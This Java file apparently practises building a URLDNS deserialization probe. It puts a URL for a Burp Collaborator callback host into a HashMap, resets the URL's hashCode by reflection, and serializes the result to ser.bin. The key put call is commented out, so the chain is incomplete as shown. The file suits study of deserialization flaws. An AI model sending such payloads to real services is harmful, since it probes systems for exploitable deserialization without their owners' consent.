package org.deserialization;


import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.URL;
import java.util.HashMap;

public class serialization {
    public static void serialize(Object obj) throws IOException{
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }
    public static void main(String[] args) throws Exception {
        Person person = new Person(22,"22");
        HashMap<URL,Integer> hashMap= new HashMap<URL,Integer>();
//        hashMap.put(new URL("http://znq21t9uq20u603617dr0jmneek48t.burpcollaborator.net"),1);
        URL url = new URL("http://7dl02q87w4esmbgwyvfva22sijo9cy.burpcollaborator.net");
        Class c = url.getClass();
        Field hashField = c.getDeclaredField("hashCode");
        hashField.setAccessible(true);
        hashField.set(url,234);
//        hashField.set(url,-1);
//        hashMap.put(url,1);
        serialize(hashMap);
//        System.out.println(person);
//        serialize(person);
    }
}
